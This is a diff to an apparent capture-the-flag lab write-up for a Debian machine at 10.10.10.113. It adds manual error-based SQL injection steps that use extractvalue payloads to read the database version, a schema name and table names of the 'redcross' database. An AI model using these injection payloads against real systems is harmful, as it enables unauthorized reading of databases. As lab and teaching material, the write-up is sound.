@@ -83,9 +83,18 @@ Machine IP: 10.10.10.113 - Debian
 ## Manual Testing
   - Inject a `'` after the `o` parameter in the query.
 ![image](https://user-images.githubusercontent.com/83878909/229354603-aef8edb5-23e7-40b8-8785-f45b4515d517.png)
-  - Extract the version information.
+  - Extract: Version information.
   - Query: `') and extractvalue(0x0a,concat(0x0a,version()))-- -`
 ![image](https://user-images.githubusercontent.com/83878909/229354803-2b283325-cc0c-4561-bceb-4a890f1a6e1d.png)
-
+  - Extract: Database name.
+  - Query: `') and extractvalue(0x0a,concat(0x0a,(select SCHEMA_NAME from INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1)))-- -`
+![image](https://user-images.githubusercontent.com/83878909/229359923-16a7107b-f98b-4294-8816-c672d7690dd6.png)
+  - Extract: Table Names
+  - Query (Table 1): `') and extractvalue(0x0a,concat(0x0a,(select TABLE_NAME from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA like "redcross" LIMIT 0,1)))-- -`
+![image](https://user-images.githubusercontent.com/83878909/229360263-2a8cfc98-5fb3-4d9b-ab61-71836b0aae34.png)
+  - Query (Table 2): `') and extractvalue(0x0a,concat(0x0a,(select TABLE_NAME from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA like "redcross" LIMIT 1,1)))-- -`
+![image](https://user-images.githubusercontent.com/83878909/229360434-d3ce41fa-586c-430a-b4f7-89549b2704e1.png)  
+  - Query (Table 3): `') and extractvalue(0x0a,concat(0x0a,(select TABLE_NAME from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA like "redcross" LIMIT 2,1)))-- -`
+![image](https://user-images.githubusercontent.com/83878909/229360478-52232c71-b380-404e-a649-e99f5afa4759.png)
 
 
